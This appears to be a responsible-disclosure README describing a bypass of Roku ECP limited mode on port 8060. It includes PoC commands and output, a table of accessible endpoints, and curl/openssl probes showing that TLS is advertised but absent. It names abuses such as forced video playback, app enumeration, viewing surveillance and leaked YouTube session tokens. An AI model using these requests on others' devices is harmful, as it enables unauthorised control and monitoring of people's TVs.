
# Roku ECP Limited Mode Bypass via /launch Endpoint

> ECP limited mode blocks `/keypress/InputHDMI1` with 403 but `/launch/tvinput.hdmi1` performs the identical action and returns 200. Same API, same port, same result on the TV — different access control.

---

## 📌 Summary

Roku TVs expose ECP (External Control Protocol) on port 8060. Users can enable **"limited mode"** to restrict remote control — `/keypress/*` commands return **403 Forbidden**.

However, the `/launch` endpoint accepts TV input identifiers (`tvinput.hdmi1`, `tvinput.dtv`, etc.) that perform the **exact same action** as the blocked keypress commands — switching the TV's active input — but `/launch` is **not blocked by limited mode**.

This is an access control inconsistency within Roku's own API. The same security policy that blocks `keypress/InputHDMI1` should also block `launch/tvinput.hdmi1`, but it does not.

---

## 🔥 Impact

- Switch TV inputs without permission (HDMI, antenna, AV)
- Launch DIAL-registered apps (Netflix, YouTube confirmed) even with limited mode on
- **Deep-link content injection** — `/launch/837?contentId=<video_id>` forces YouTube to play a specific video, bypassing the profile selection screen entirely
- **App kill** — `/keypress/Home` is blocked (403) but `/launch/tvinput.hdmi1` forces the running app off and switches input, achieving the same disruption
- Enumerate installed apps via `/launch/{id}` + `/query/active-app` (bypasses `/query/apps` 403)
- Detect physical devices connected via HDMI-CEC (`/launch/tvinput.hdmi*` reveals device names)
- Monitor what the user is watching via `/query/active-app`
- All of the above works in standby mode (`power-mode: Ready`)
- No authentication, pairing, or user interaction required
- Bypasses the most restrictive security setting available
- Device reports `ecp-tls-enabled: true` in `/query/device-info` but serves plaintext HTTP on all ports — the TLS flag is cosmetic
- Note: `/input` endpoint accepts touch/accelerometer/directional events (200) but does **not** navigate the UI — it only delivers sensor data to apps that explicitly register for it

---

## 🚀 Proof of Concept

```bash
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python3 poc.py --ip <ROKU_IP> --poc
```

```
[*] ECP keypress check (should be blocked):
    /keypress/InputHDMI1: 403 — BLOCKED
    /keypress/InputHDMI2: 403 — BLOCKED
    /keypress/InputHDMI3: 403 — BLOCKED
    /keypress/InputHDMI4: 403 — BLOCKED
    /keypress/InputTuner: 403 — BLOCKED
    /keypress/InputAV1: 403 — BLOCKED

[*] ECP /launch bypass (same actions, should work):
    /launch/tvinput.hdmi1: 200 — BYPASSED
    /launch/tvinput.hdmi2: 200 — BYPASSED
    /launch/tvinput.hdmi3: 200 — BYPASSED
    /launch/tvinput.hdmi4: 200 — BYPASSED
    /launch/tvinput.dtv: 200 — BYPASSED
    /launch/tvinput.cvbs: 200 — BYPASSED

[*] Side-by-side comparison:
    /keypress/InputHDMI1: 403
    /launch/tvinput.hdmi1: 200
    ^ BYPASS CONFIRMED — same action, different result
```

### Other commands
```bash
python3 poc.py --ip <ROKU_IP> -k tvinput.hdmi1    # switch to HDMI 1
python3 poc.py --ip <ROKU_IP> -k tvinput.dtv       # switch to antenna
python3 poc.py --inputs                             # list all inputs
```

---

## Endpoint Access with Limited Mode ON

Confirmed live against TCL 32S327, Roku OS 16.0.4, limited mode enabled.

### Accessible (bypass)

| Endpoint | What it does |
|---|---|
| `/launch/{app_id}` | Launch apps, switch inputs, deep-link content, kill apps |
| `/launch/837?contentId=<id>` | Force YouTube to specific video (bypasses profile screen) |
| `/launch/tvinput.hdmi1` | Switch input / kill running app |
| `/query/device-info` | Full device fingerprint (60+ fields) |
| `/query/active-app` | What's currently running (surveillance) |
| `/input` | Returns 200 but only delivers sensor data to apps, does not navigate UI |
| `/dial/Netflix` | DIAL state enumeration |
| `/dial/YouTube` | DIAL state + leaks session tokens (`yumi`, `oisi`) |
| `port 7000 /info` | AirPlay info — separate MAC, serial, firmware, display caps |

### Blocked (403)

| Endpoint | What it blocks |
|---|---|
| `/keypress/*` | All remote key presses (Home, Select, arrows, inputs) |
| `/keydown/*`, `/keyup/*` | Key hold/release |
| `/query/apps` | Installed app list |
| `/query/media-player` | Media player state |
| `/query/tv-channels` | Channel list |
| `/query/tv-active-channel` | Active channel |
| `/search` | Content search |

---

## 🔐 ECP-TLS: Advertised But Not Implemented

The device reports security capabilities that do not function:

```xml
<secure-device>true</secure-device>
<ecp-setting-mode>limited</ecp-setting-mode>
<ecp-tls-enabled>true</ecp-tls-enabled>
```

Despite `ecp-tls-enabled: true`, there is **no TLS listener on any port**. Tested ports 443, 7000, 7443, 8060, 8061, 8160, 8260, 8443, 9060, 9443 — all plaintext or closed.

The `/ecp-session` endpoint returns **400 Bad Request** (not 404), confirming the pairing mechanism exists but the encryption layer is not running. HTTPS connections to port 8060 fail silently. TLS upgrade headers are ignored.

```bash
# TLS probe — no certificate on any port
echo | openssl s_client -connect <ROKU_IP>:8060 2>&1 | grep "no peer certificate"
# no peer certificate available

# ecp-session exists but rejects all input formats
curl -X POST http://<ROKU_IP>:8060/ecp-session
# HTTP/1.1 400 Bad Request

# HTTPS to 8060 — silent failure
curl -sk https://<ROKU_IP>:8060/query/device-info
# (empty response)
```

The device falsely advertises TLS support while serving all ECP traffic over unencrypted HTTP. Any client or security tool that reads `ecp-tls-enabled: true` and assumes encrypted communication would be wrong.

---

## 🧬 Affected Product

- **Vendor:** Roku, Inc.
- **Product:** Roku OS (embedded in TCL, Hisense, RCA, and other OEM Roku TVs)
- **Tested Model:** TCL 32S327
- **Tested Firmware:** Roku OS 16.0.4 (Build 48H.04E00853A)
- **Likely Affected:** All Roku OS devices with limited mode

---

## 🛑 Disclaimer

For **educational and responsible disclosure purposes only**.  
Do not test on devices you don't own or lack permission to assess.

---

## 🕒 Disclosure Timeline

- Vulnerability discovered: 2026-11-16
- Reported to: VulnCheck
- CVE status: **Pending**
- Researcher: **nsm_barii** — https://github.com/nsm-barii

